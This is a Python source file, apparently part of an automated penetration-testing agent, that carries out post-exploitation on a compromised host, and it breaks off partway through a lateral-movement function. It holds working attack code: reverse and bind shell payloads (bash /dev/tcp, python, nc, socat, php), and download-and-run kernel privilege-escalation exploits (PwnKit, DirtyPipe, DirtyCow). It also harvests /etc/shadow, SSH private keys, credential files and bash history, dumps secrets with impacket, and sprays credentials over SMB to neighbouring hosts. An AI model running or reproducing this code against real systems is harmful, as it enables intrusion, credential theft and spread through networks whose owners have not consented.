"""
post_agent.py
主机攻链后渗透 —— 分阶段：立足后枚举 / 提权尝试 / 目标收集

三种执行通道（优先级递减）：
  1. MSF 会话 → msf.run_session_command
  2. RCE 模板 → ToolExecutor 复用利用命令在靶机执行
  3. 证据模式 → 解析利用阶段输出，启发式建议
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
from typing import Any, Awaitable, Callable, Optional

from backend.agents.models import ExploitResult
from backend.tools.msf_client import MsfClient
from backend.tools.executor import ToolExecutor, ExecuteResult

logger = logging.getLogger(__name__)

LogCb = Optional[Callable[[str], Awaitable[None]]]
RecordCb = Optional[Callable[[dict], Awaitable[None]]]


def _extract_rce_template(result: ExploitResult) -> Optional[str]:
    """Try to extract a reusable RCE command template from exploit records.

    Scans the command history for the successful RCE command (one whose
    output contained uid=) and returns it with the executed OS command
    replaced by the placeholder {CMD}.  Returns None if no template
    can be reconstructed.
    """
    records = result.command_records or result.command_results or []
    for rec in reversed(records):
        if not isinstance(rec, dict):
            continue
        out = rec.get("stdout", "")
        cmd = rec.get("command", "")
        if not cmd or not re.search(r"uid=\d+", out):
            continue
        # curl-based web RCE: replace the OS command portion
        # Pattern: system('CMD') or system("CMD") in URL or POST data
        for pat, repl_fn in [
            (r"system\(['\"]([^'\"]+)['\"]\)", lambda m: f'system(\'{{{{"CMD"}}}}\')' ),
            (r"\bcmd=([^\s&\"']+)", lambda m: "cmd={CMD}"),
            (r"'id'", lambda m: "'{CMD}'"),
            (r'"id"', lambda m: '"{CMD}"'),
        ]:
            import re as _re
            if _re.search(pat, cmd):
                template = _re.sub(pat, repl_fn, cmd, count=1)
                return template
    return None


async def _run_cmd_via_rce(
    template: str,
    os_cmd: str,
    task_id: Optional[str],
    timeout: int = 30,
) -> str:
    """Execute an OS command on the target by substituting into the RCE template."""
    from backend.tools.executor import ToolExecutor
    script = template.replace("{CMD}", os_cmd)
    executor = ToolExecutor()
    result = await executor.run_script(
        script_content=script,
        timeout=timeout,
        task_id=task_id,
    )
    return (result.stdout or "").strip()


def _concat_exploit_outputs(results: list[ExploitResult]) -> str:
    chunks: list[str] = []
    for r in results:
        if r.evidence:
            chunks.append(str(r.evidence))
        records = r.command_results or r.command_records or []
        for cr in records:
            if isinstance(cr, dict):
                chunks.append(str(cr.get("stdout", "")))
                chunks.append(str(cr.get("stderr", "")))
    return "\n".join(chunks)[:20000]


def _infer_privilege_from_text(text: str) -> str:
    t = text.lower()
    if re.search(r"uid=0[\s\)\(]", t) or re.search(r"\buid=0\(", t):
        return "root"
    if "uid=" in t:
        return "user"
    return "unknown"


def _extract_cred_hints(blob: str) -> list[dict[str, Any]]:
    """从输出中粗提凭据线索（启发式，非结构化秘密存储）。"""
    out: list[dict[str, Any]] = []
    for m in re.finditer(
        r"(?i)(password|passwd|pwd)\s*[=:]\s*([^\s\n]{3,64})",
        blob[:12000],
    ):
        out.append({
            "type": "password_hint",
            "pattern": m.group(0)[:80],
            "source": "output_grep",
        })
    return out[:15]


def _extract_loot_hints(blob: str) -> list[dict[str, Any]]:
    loot: list[dict[str, Any]] = []
    paths = re.findall(r"(/etc/passwd|/etc/shadow|id_rsa|proof\.txt|user\.txt|root\.txt)", blob, re.I)
    for p in set(paths):
        loot.append({"type": "path_mention", "path": p, "source": "output_grep"})
    return loot[:20]


# ── Direct CVE exploit commands for RCE-template-based exploitation ──
_CVE_EXPLOIT_CMDS: dict[str, list[str]] = {
    # CVE-2021-4034 PwnKit — pkexec local privilege escalation
    "CVE-2021-4034": [
        "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
        "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
        "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
    ],
    "PwnKit": [
        "cd /tmp && curl -sLO https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null || "
        "wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null; "
        "chmod +x PwnKit 2>/dev/null; ./PwnKit 'id' 2>/dev/null",
    ],
    # CVE-2022-0847 DirtyPipe
    "CVE-2022-0847": [
        "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
        "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
    ],
    "DirtyPipe": [
        "cd /tmp && curl -sLO https://haxx.in/files/dirtypipez.c 2>/dev/null 2>&1; "
        "gcc dirtypipez.c -o dirtypipez 2>/dev/null; ./dirtypipez /usr/bin/su 2>/dev/null",
    ],
    # CVE-2016-5195 DirtyCow
    "CVE-2016-5195": [
        "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
        "gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null; ./dirty 2>/dev/null; su firefart -c 'id' 2>/dev/null",
    ],
    "DirtyCow": [
        "cd /tmp && curl -sLO https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c 2>/dev/null; "
        "gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null; ./dirty 2>/dev/null; su firefart -c 'id' 2>/dev/null",
    ],
    # CVE-2021-3493 OverlayFS
    "CVE-2021-3493": [
        "cd /tmp && curl -sLO https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c 2>/dev/null; "
        "gcc exploit.c -o overlayfs 2>/dev/null; ./overlayfs 2>/dev/null && id",
    ],
}


class PostExploitAgent:
    def __init__(self):
        self.msf = MsfClient()
        self.executor = ToolExecutor()

    @staticmethod
    async def _log(cb: LogCb, msg: str) -> None:
        """Fire-and-forget log callback helper."""
        if cb:
            try:
                await cb(msg)
            except Exception:
                pass

    async def _upgrade_to_reverse_shell(
        self,
        rce_template: str,
        target_os: str,
        task_id: Optional[str],
        log_callback: LogCb = None,
    ) -> Optional[str]:
        """Attempt to upgrade from RCE template to a reverse shell.

        Starts pwncat-cs listener, then tries multiple payload types
        (bash, python, nc, php, socat). Returns the method name on
        success, None on failure.
        """
        lhost = os.getenv("LHOST", "")
        lport = os.getenv("LPORT", "4444")
        if not lhost:
            await self._log(log_callback, "[PostAgent] LHOST 未设置，跳过反弹 shell")
            return None

        # ── Start pwncat-cs listener (background) ──────────
        listener_task = None
        try:
            listener_task = asyncio.create_task(
                self.executor.run(
                    tool="pwncat-cs",
                    args=["-l", "-p", lport, "--ssl"],
                    timeout=0,  # Keep listening
                    task_id=task_id,
                )
            )
            await self._log(log_callback, f"[PostAgent] pwncat-cs 监听已启动: {lhost}:{lport}")
        except Exception as e:
            logger.debug(f"[PostAgent] pwncat-cs listener failed: {e}")

        payloads: list[tuple[str, str]] = [
            ("bash", f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"),
            ("python", f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            ("nc", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
            ("socat", f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"),
        ]
        if target_os != "windows":
            payloads.append(
                ("php", f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            )

        for method, payload in payloads:
            await self._log(log_callback, f"[PostAgent] 尝试反弹 shell ({method})...")
            try:
                cmd = rce_template.replace("{CMD}", payload)
                result = await self.executor.run_script(
                    script_content=cmd,
                    timeout=15,
                    task_id=task_id,
                )
                if result.exit_code == 0:
                    logger.info(f"[PostAgent] ✅ 反弹 shell 成功 ({method})")
                    await self._log(log_callback, f"[PostAgent] ✅ 反弹 shell 建立: {method}")
                    return method
            except Exception as e:
                logger.debug(f"[PostAgent] 反弹 shell ({method}) 失败: {e}")

        # Cancel listener on failure
        if listener_task and not listener_task.done():
            listener_task.cancel()
        return None

    async def _upgrade_to_bind_shell(
        self,
        rce_template: str,
        target_os: str,
        task_id: Optional[str],
        log_callback: LogCb = None,
    ) -> Optional[str]:
        """Attempt to establish a bind shell (target listens, we connect).

        Useful for internal networks where reverse connections are
        blocked by egress filtering.
        """
        bport = os.getenv("BPORT", "5555")
        await self._log(log_callback, f"[PostAgent] 尝试 bind shell (port {bport})...")

        # Deploy bind shell listener on target
        bind_payloads: list[tuple[str, str]] = [
            ("nc_bind", f"ncat -lvp {bport} -e /bin/sh &"),
            ("python_bind", (
                f"python3 -c \"import socket,os,subprocess;s=socket.socket();"
                f"s.bind(('0.0.0.0',{bport}));s.listen(1);"
                f"c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);"
                f"os.dup2(c.fileno(),2);subprocess.call(['/bin/sh','-i'])\" &"
            )),
            ("bash_bind", f"bash -c 'exec 5<>/dev/tcp/0.0.0.0/{bport}; cat <&5 | while read line; do $line 2>&5 >&5; done' &"),
        ]

        for method, payload in bind_payloads:
            await self._log(log_callback, f"[PostAgent] 部署 bind shell ({method})...")
            try:
                cmd = rce_template.replace("{CMD}", payload)
                result = await self.executor.run_script(
                    script_content=cmd,
                    timeout=15,
                    task_id=task_id,
                )
                if result.exit_code == 0 and "error" not in (result.stderr or "").lower():
                    logger.info(f"[PostAgent] ✅ bind shell 部署成功 ({method})")
                    await self._log(log_callback, f"[PostAgent] ✅ bind shell 已部署: 0.0.0.0:{bport}")
                    return method
            except Exception as e:
                logger.debug(f"[PostAgent] bind shell ({method}) 失败: {e}")

        return None

    async def run(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """兼容旧入口：串联三阶段结果（单 dict 合并）。"""
        pf = await self.run_post_foothold_enum(
            exploit_results, target_os, task_id,
            log_callback=log_callback, record_callback=record_callback,
        )
        pv = await self.run_privesc_phase(
            exploit_results, target_os, task_id, round_num=1,
            log_callback=log_callback, record_callback=record_callback,
        )
        ob = await self.run_objective_collect(
            exploit_results, target_os, task_id,
            log_callback=log_callback, record_callback=record_callback,
        )
        privilege = pv.get("final_privilege") or pf.get("final_privilege") or "unknown"
        nested = {
            "post_foothold": pf.get("findings", {}),
            "privesc": pv.get("findings", {}),
            "objective": ob.get("findings", {}),
        }
        return {
            "status": "completed",
            "final_privilege": privilege,
            "findings": nested,
            "next_steps": (pv.get("next_steps") or []) + (ob.get("next_steps") or []),
        }

    async def run_post_foothold_enum(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        successful = [r for r in exploit_results if r.success]
        if not successful:
            return {"status": "skipped", "final_privilege": "unknown", "findings": {}, "new_credentials": [], "loot_hints": [], "privesc_hypotheses": [], "next_steps": []}

        first = successful[0]
        session_info = first.session_info or {}
        session_id = session_info.get("session_id")

        next_steps: list[dict[str, Any]] = []
        new_credentials: list[dict[str, Any]] = []
        loot_hints: list[dict[str, Any]] = []
        hypotheses: list[dict[str, Any]] = []

        if session_id:
            try:
                try:
                    from backend.api.main import is_msf_available
                    if not is_msf_available():
                        raise RuntimeError("msf off")
                except Exception:
                    raise RuntimeError("msf off")
                await self.msf.connect()
            except Exception as e:
                logger.warning("[PostAgent] post_foothold MSF 不可用: %s", e)
                return self._post_foothold_from_evidence(first, target_os)

            findings: dict[str, Any] = {}
            whoami_out = await self.msf.run_session_command(session_id, "whoami")
            id_out = await self.msf.run_session_command(session_id, "id 2>/dev/null || true")
            uname_out = await self.msf.run_session_command(session_id, "uname -a 2>/dev/null || ver")
            findings["current_user"] = whoami_out.strip()
            findings["id"] = id_out[:800]
            findings["uname"] = uname_out[:800]
            if target_os == "linux":
                findings["sudo_preview"] = (
                    await self.msf.run_session_command(session_id, "sudo -l 2>/dev/null")
                )[:600]
                findings["suid_preview"] = (
                    await self.msf.run_session_command(
                        session_id, "find / -perm -4000 -type f 2>/dev/null | head -25"
                    )
                )[:800]
            findings["source"] = "msf_session"
            privilege = "root" if any(
                x in whoami_out.lower() for x in ("root", "administrator", "system")
            ) else "user"
            if privilege != "root":
                hypotheses.append({"vector": "sudo", "detail": "检查 sudo -l 与 SUID 列表", "confidence": 0.4})
                hypotheses.append({"vector": "kernel", "detail": "对照 uname -a 与已知 LPE", "confidence": 0.3})
            next_steps.append({
                "stage": "privesc",
                "action": "基于枚举结果验证 sudo/SUID/内核提权面",
                "priority": 1,
            })
            return {
                "status": "ok",
                "final_privilege": privilege,
                "findings": findings,
                "new_credentials": new_credentials,
                "loot_hints": loot_hints,
                "privesc_hypotheses": hypotheses,
                "next_steps": next_steps,
            }

        rce_template = _extract_rce_template(first)
        if rce_template and first.exploit_level in ("rce", ""):
            shell_method = await self._upgrade_to_reverse_shell(
                rce_template, target_os, task_id, log_callback,
            )
            if shell_method and log_callback:
                try:
                    await log_callback(f"[PostAgent] 反弹 shell 建立成功 ({shell_method})")
                except Exception:
                    pass

        return self._post_foothold_from_evidence(first, target_os)

    def _post_foothold_from_evidence(self, result: ExploitResult, target_os: str) -> dict[str, Any]:
        blob = _concat_exploit_outputs([result])
        si = result.session_info or {}
        current = (si.get("current_user") or "").strip()
        if not current:
            m = re.search(r"uid=\d+\([^)]+\)", blob)
            if m:
                current = m.group(0)
        privilege = _infer_privilege_from_text(blob)
        new_credentials = _extract_cred_hints(blob)
        loot_hints = _extract_loot_hints(blob)
        hypotheses = self._heuristic_privesc_hints(blob, target_os)
        hlist = []
        if hypotheses.get("sudo_mentioned"):
            hlist.append({"vector": "sudo", "detail": "输出中出现 sudo/NOPASSWD 线索", "confidence": 0.5})
        if hypotheses.get("suid_mentioned"):
            hlist.append({"vector": "suid", "detail": "输出中出现 SUID/find -perm 线索", "confidence": 0.45})
        if hypotheses.get("kernel_hint"):
            hlist.append({"vector": "kernel", "detail": "输出中出现内核版本信息", "confidence": 0.35})
        next_steps: list[dict[str, Any]] = [
            {
                "stage": "foothold",
                "action": "若为 Web RCE，优先稳定为反弹 shell 或 SSH 会话再深度枚举",
                "priority": 1,
            },
            {
                "stage": "privesc",
                "action": "对照 privesc_hypotheses 逐项验证（sudo -l、SUID、capabilities、cron）",
                "priority": 2,
            },
        ]
        findings = {
            "current_user": current or "unknown",
            "privesc_attempt": hypotheses,
            "source": "react_evidence",
            "note": "无 MSF 会话；立足后枚举来自利用阶段输出解析。",
        }
        return {
            "status": "ok",
            "final_privilege": privilege,
            "findings": findings,
            "new_credentials": new_credentials,
            "loot_hints": loot_hints,
            "privesc_hypotheses": hlist,
            "next_steps": next_steps,
        }

    async def run_privesc_phase(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        round_num: int = 1,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        _ = task_id, log_callback, record_callback
        successful = [r for r in exploit_results if r.success]
        if not successful:
            return {"status": "skipped", "final_privilege": "unknown", "findings": {}, "next_steps": []}

        first = successful[0]
        session_info = first.session_info or {}
        session_id = session_info.get("session_id")

        if session_id:
            try:
                try:
                    from backend.api.main import is_msf_available
                    if not is_msf_available():
                        raise RuntimeError("msf off")
                except Exception:
                    raise RuntimeError("msf off")
                await self.msf.connect()
            except Exception:
                blob = _concat_exploit_outputs([first])
                return {
                    "status": "evidence_only",
                    "final_privilege": _infer_privilege_from_text(blob),
                    "findings": {"note": "提权轮次：无 MSF，跳过远程提权命令", "round": round_num},
                    "next_steps": [{"stage": "privesc", "action": "获取稳定 shell 后使用专用提权脚本或手工验证", "priority": 1}],
                }

            whoami_out = await self.msf.run_session_command(session_id, "whoami")
            privilege = "root" if any(
                x in whoami_out.lower() for x in ["root", "system", "administrator"]
            ) else "user"
            findings: dict[str, Any] = {"round": round_num, "whoami": whoami_out.strip()}
            if privilege != "root" and target_os == "linux":
                priv_result = await self._linux_privesc(session_id)
                findings["privesc_attempt"] = priv_result
                if priv_result.get("success"):
                    privilege = "root"
            elif privilege != "root":
                priv_result = await self._windows_privesc(session_id)
                findings["privesc_attempt"] = priv_result
                if priv_result.get("success"):
                    privilege = "root"

            next_steps = []
            if privilege != "root":
                next_steps.append({
                    "stage": "privesc",
                    "action": f"第 {round_num} 轮未提权成功：检查内核/CVE、定时任务与可写服务单元",
                    "priority": 2,
                })
            return {
                "status": "ok",
                "final_privilege": privilege,
                "findings": findings,
                "next_steps": next_steps,
            }

        # No MSF session -- try RCE template if available
        rce_template = _extract_rce_template(first)
        if rce_template and first.exploit_level in ("rce", ""):
            logger.info("[PostAgent] 无 MSF 会话，通过 RCE 模板执行提权侦察")
            return await self._privesc_via_rce_template(
                rce_template, first, target_os, task_id, round_num,
                log_callback=log_callback, record_callback=record_callback,
            )

        blob = _concat_exploit_outputs([first])
        priv = _infer_privilege_from_text(blob)
        return {
            "status": "evidence_only",
            "final_privilege": priv,
            "findings": {
                "round": round_num,
                "note": "无交互会话且无可复用 RCE 模板；仅保留证据级判断",
            },
            "next_steps": [{
                "stage": "privesc",
                "action": "建立反弹 shell / SSH 后再执行 sudo -l 与 SUID 枚举",
                "priority": 1,
            }],
        }

    async def _privesc_via_rce_template(
        self,
        template: str,
        result: ExploitResult,
        target_os: str,
        task_id: Optional[str],
        round_num: int,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """Run privesc recon commands on target via the RCE exploit template."""
        findings: dict[str, Any] = {"round": round_num, "source": "rce_template"}

        async def _rce(cmd: str) -> str:
            if log_callback:
                try:
                    await log_callback(f"[PostAgent] RCE 模板执行: {cmd}")
                except Exception:
                    pass
            try:
                return await _run_cmd_via_rce(template, cmd, task_id, timeout=30)
            except Exception as e:
                logger.warning(f"[PostAgent] RCE 模板执行失败: {e}")
                return ""

        whoami_out = await _rce("whoami")
        id_out = await _rce("id")
        findings["current_user"] = whoami_out
        findings["id"] = id_out[:800]

        privilege = "root" if any(
            x in (whoami_out + id_out).lower() for x in ("root", "uid=0(")
        ) else "user"

        if privilege != "root" and target_os == "linux":
            findings["uname"] = (await _rce("uname -a"))[:800]
            findings["sudo_preview"] = (await _rce("sudo -l 2>/dev/null"))[:600]
            findings["suid_preview"] = (await _rce(
                "find / -perm -4000 -type f 2>/dev/null | head -25"
            ))[:800]
            findings["crontab"] = (await _rce("cat /etc/crontab 2>/dev/null"))[:400]
            findings["capabilities"] = (await _rce(
                "getcap -r / 2>/dev/null | head -20"
            ))[:400]

            linpeas_out = await _rce(
                "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
                "2>/dev/null | timeout 120 bash 2>/dev/null | head -500"
            )
            if linpeas_out and len(linpeas_out) > 100:
                findings["linpeas_summary"] = linpeas_out[:2000]
                for vec in ["CVE-", "Vulnerable to", "99%", "95%"]:
                    if vec in linpeas_out:
                        findings.setdefault("linpeas_highlights", []).append(
                            vec + ": " + linpeas_out[linpeas_out.index(vec):linpeas_out.index(vec)+200]
                        )

            pspy_out = await _rce(
                "timeout 30 /opt/tools/pspy64 --ppid 2>/dev/null | head -100 || echo __PSPY_MISSING__"
            )
            if pspy_out and "__PSPY_MISSING__" not in pspy_out and len(pspy_out) > 50:
                findings["pspy_summary"] = pspy_out[:1500]

            interesting = ["bash", "vim", "nano", "python", "perl", "find",
                           "nmap", "less", "more", "env", "awk"]
            suid_out = findings.get("suid_preview", "")
            found_suid = [b for b in interesting if b in suid_out]
            sudo_out = findings.get("sudo_preview", "")
            priv_success = len(found_suid) > 0 or "NOPASSWD" in sudo_out
            # ── Attempt CVE exploitation based on linpeas highlights ──
            linpeas_hl = findings.get("linpeas_highlights", [])
            cve_results = await self._attempt_cve_exploitation(
                session_id=None,
                linpeas_highlights=linpeas_hl,
                via_msf=False,
                rce_template=template,
                task_id=task_id,
            )
            any_cve_success = any(r.get("success") for r in cve_results)
            if cve_results:
                findings["cve_attempts"] = cve_results

            findings["privesc_attempt"] = {
                "method": "rce_template_recon",
                "suid_binaries": found_suid,
                "sudo_rules": sudo_out[:300],
                "success": priv_success or any_cve_success,
            }
            if priv_success or any_cve_success:
                privilege = "root"

        hypotheses = []
        if privilege != "root":
            hypotheses.append({"vector": "sudo", "detail": "检查 sudo -l 输出", "confidence": 0.4})
            hypotheses.append({"vector": "suid", "detail": "检查 SUID 列表", "confidence": 0.4})
            hypotheses.append({"vector": "kernel", "detail": "对照 uname -a 与已知 LPE", "confidence": 0.3})
        next_steps = []
        if privilege != "root":
            next_steps.append({
                "stage": "privesc",
                "action": f"第 {round_num} 轮: 基于 SUID/sudo/kernel 结果验证提权",
                "priority": 2,
            })
        return {
            "status": "ok",
            "final_privilege": privilege,
            "findings": findings,
            "privesc_hypotheses": hypotheses,
            "next_steps": next_steps,
        }

    async def run_objective_collect(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        blob = _concat_exploit_outputs([r for r in exploit_results if r.success])
        obj: dict[str, Any] = {}
        collected_loot: list[dict[str, Any]] = []

        if re.search(r"proof\.txt|user\.txt|root\.txt|\bflag\{", blob, re.I):
            obj["flag_hints"] = True
        if "root" in blob.lower() and re.search(r"uid=0", blob.lower()):
            obj["root_context_hint"] = True

        successful = [r for r in exploit_results if r.success]
        rce_template = _extract_rce_template(successful[0]) if successful else None

        if rce_template and (successful[0].exploit_level in ("rce", "") if successful else False):
            async def _rce(cmd: str) -> str:
                try:
                    return await _run_cmd_via_rce(rce_template, cmd, task_id, timeout=30)
                except Exception:
                    return ""

            flag_search = await _rce(
                "find / -maxdepth 4 \\( -name 'flag*' -o -name 'proof.txt' "
                "-o -name 'user.txt' -o -name 'root.txt' \\) "
                "-type f 2>/dev/null | head -20"
            )
            if flag_search.strip():
                obj["flag_hints"] = True
                for fpath in flag_search.strip().splitlines()[:10]:
                    fpath = fpath.strip()
                    if fpath:
                        content = await _rce(f"cat {fpath} 2>/dev/null | head -5")
                        collected_loot.append({"path": fpath, "content": content[:500]})

            shadow = await _rce("cat /etc/shadow 2>/dev/null | head -20")
            if shadow and ":" in shadow and "Permission denied" not in shadow:
                collected_loot.append({"path": "/etc/shadow", "content": shadow[:2000]})

            cred_files = await _rce(
                "find / -maxdepth 4 \\( -name '.env' -o -name 'wp-config.php' "
                "-o -name 'config.php' -o -name '.htpasswd' -o -name 'database.yml' "
                "-o -name 'settings.py' \\) -type f 2>/dev/null | head -10"
            )
            for cf in (cred_files or "").strip().splitlines()[:5]:
                cf = cf.strip()
                if cf:
                    content = await _rce(f"cat {cf} 2>/dev/null | head -30")
                    if content and "Permission denied" not in content:
                        collected_loot.append({"path": cf, "content": content[:1000]})

            history = await _rce(
                "cat /root/.bash_history 2>/dev/null | tail -50 || "
                "cat /home/*/.bash_history 2>/dev/null | tail -50"
            )
            if history and len(history) > 20:
                collected_loot.append({"path": "bash_history", "content": history[:2000]})

            ssh_keys = await _rce(
                "find /root/.ssh /home/*/.ssh -name 'id_*' -type f 2>/dev/null | head -5"
            )
            for kf in (ssh_keys or "").strip().splitlines()[:3]:
                kf = kf.strip()
                if kf:
                    content = await _rce(f"cat {kf} 2>/dev/null | head -30")
                    if content and "PRIVATE KEY" in content:
                        collected_loot.append({"path": kf, "content": content[:2000]})

            if log_callback:
                try:
                    await log_callback(
                        f"[PostAgent] 目标收集完成: {len(collected_loot)} 项 loot"
                    )
                except Exception:
                    pass

            # ── impacket-secretsdump: dump SAM / LSA / NTDS ──
            first_success = successful[0]
            target_ip = (first_success.session_info or {}).get("target_ip", "")
            if target_ip:
                for cred in _extract_cred_hints(_concat_exploit_outputs([first_success])):
                    user = cred.get("pattern", "").split(":")[0].split("=")[-1]
                    pw = cred.get("pattern", "").split(":")[-1].split("=")[-1]
                    if user and pw and len(pw) > 1:
                        try:
                            sd_result = await self.executor.run(
                                tool="impacket-secretsdump",
                                args=[f"{user}:{pw}@{target_ip}"],
                                timeout=60,
                                task_id=task_id,
                            )
                            if sd_result.success and (sd_result.stdout or ""):
                                collected_loot.append({
                                    "path": "impacket-secretsdump",
                                    "content": (sd_result.stdout or "")[:3000],
                                })
                                if log_callback:
                                    await log_callback("[PostAgent] ✅ secretsdump 凭证导出成功")
                                break
                        except Exception as e:
                            logger.debug(f"[PostAgent] secretsdump 失败: {e}")

            # ── Database dumping ────────────────────────────
            for db_type, db_port, dump_cmd in [
                ("mysql", 3306, "mysql -u root -e 'SHOW DATABASES;' 2>/dev/null | head -30"),
                ("postgresql", 5432, "psql -U postgres -c '\\l' 2>/dev/null | head -30"),
                ("mongodb", 27017, "echo 'show dbs' | mongo --quiet 2>/dev/null | head -30"),
                ("redis", 6379, "redis-cli KEYS '*' 2>/dev/null | head -30"),
            ]:
                db_out = await _rce(dump_cmd, timeout=15)
                if db_out and len(db_out) > 10 and "command not found" not in db_out.lower():
                    collected_loot.append({
                        "path": f"database_{db_type}",
                        "content": db_out[:2000],
                    })
                    if log_callback:
                        try:
                            await log_callback(f"[PostAgent] ✅ {db_type} 数据库信息已收集")
                        except Exception:
                            pass

            # ── Parse linpeas output for sensitive file paths ──
            linpeas_summary = await _rce(
                "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
                "2>/dev/null | timeout 120 bash 2>/dev/null | head -500",
                timeout=130,
            )
            if linpeas_summary:
                for sensitive_pattern, label in [
                    (r"/etc/(?:shadow|passwd|group|sudoers)", "sensitive_system"),
                    (r"/\w+/\w*config\w*\.(?:php|yml|json|ini|conf)", "config_files"),
                    (r"/\w+/\w*\.(?:pem|key|crt|p12|pfx)", "crypto_material"),
                    (r"/\w+/\w*backup\w*", "backup_files"),
                    (r"/\w+/\w*log\w*\.\w+", "log_files"),
                ]:
                    for m in re.finditer(sensitive_pattern, linpeas_summary, re.I):
                        fpath = m.group(0)
                        if not any(l.get("path") == fpath for l in collected_loot):
                            content = await _rce(f"cat {fpath} 2>/dev/null | head -20")
                            if content and "Permission denied" not in content:
                                collected_loot.append({
                                    "path": fpath,
                                    "content": content[:1000],
                                    "source": "linpeas_parse",
                                })

        obj["collected_loot"] = collected_loot
        next_steps: list[dict[str, Any]] = []
        if not obj.get("flag_hints"):
            next_steps.append({
                "stage": "objective",
                "action": "在 /root、/home、Web 目录搜索 proof.txt / user.txt / flag*",
                "priority": 2,
            })
        return {
            "status": "ok",
            "findings": obj,
            "next_steps": next_steps,
        }

    async def run_lateral_movement(
        self,
        exploit_results: list[ExploitResult],
        credential_store: list[dict],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """Attempt lateral movement using discovered credentials and tools.

        Uses netexec / impacket-psexec / impacket-secretsdump / smbmap via
        ToolExecutor, with credential_store driving auto-detected targets.
        Targets discovered via arp / /etc/hosts from the compromised host.
        """
        successful = [r for r in exploit_results if r.success]
        if not successful:
            await self._log(log_callback, "[PostAgent] 横向移动跳过：无成功利用")
            return {"status": "skipped", "lateral_hosts": [], "findings": {}}

        first = successful[0]
        rce_template = _extract_rce_template(first)
        session_id = (first.session_info or {}).get("session_id")
        lateral_hosts: list[str] = []
        findings: dict[str, Any] = {}

        # ── Phase 1: discover lateral targets ────────────────
        if rce_template and first.exploit_level in ("rce", ""):
            async def _rce(cmd: str) -> str:
                try:
                    return await _run_cmd_via_rce(rce_template, cmd, task_id, timeout=30)
                except Exception:
                    return ""

            arp_out = await _rce("arp -a 2>/dev/null || ip neigh 2>/dev/null")
            hosts_out = await _rce("cat /etc/hosts 2>/dev/null | grep -v '^#' | grep -v '^$'")
            for line in (arp_out + "\n" + hosts_out).splitlines():
                for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line):
                    ip = m.group(1)
                    if ip not in ("127.0.0.1", "0.0.0.0") and ip not in lateral_hosts:
                        lateral_hosts.append(ip)
            findings["discovered_hosts"] = lateral_hosts[:20]
            await self._log(log_callback, f"[PostAgent] 发现 {len(lateral_hosts[:20])} 个横向目标")
        elif session_id:
            # Fallback via MSF session
            try:
                arp_raw = await self.msf.run_session_command(session_id, "arp -a 2>/dev/null || ip neigh 2>/dev/null")
                for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", arp_raw):
                    ip = m.group(1)
                    if ip not in ("127.0.0.1", "0.0.0.0") and ip not in lateral_hosts:
                        lateral_hosts.append(ip)
                findings["discovered_hosts"] = lateral_hosts[:20]
            except Exception:
                pass

        if not lateral_hosts:
            await self._log(log_callback, "[PostAgent] 横向移动跳过：未发现内网主机")
            return {"status": "ok", "lateral_hosts": [], "findings": findings}

        # ── Phase 2: attempt lateral movement per credential ──
        lateral_successes: list[dict[str, Any]] = []
        for cred in credential_store[:8]:
            user = cred.get("user") or cred.get("pattern", "")
            password = cred.get("value") or cred.get("password", "")
            nt_hash = cred.get("nt_hash") or cred.get("nthash", "")
            source = cred.get("source", "unknown")
            if not user:
                continue

            for host in lateral_hosts[:6]:
                if any(s["host"] == host for s in lateral_successes):
                    continue  # already succeeded on this host

                # --- SMB (netexec) ---
                try:
                    result = await self.executor.run(
                        tool="netexec",
                        args=["smb", host, "-u", user, "-p", password, "--shares"],
                        timeout=30, task_id=task_id,
                    )
                    if result.success and ("Pwn3d" in (result.stdout or "") or "[+]" in (result.stdout or "")):
                        lateral_successes.append({
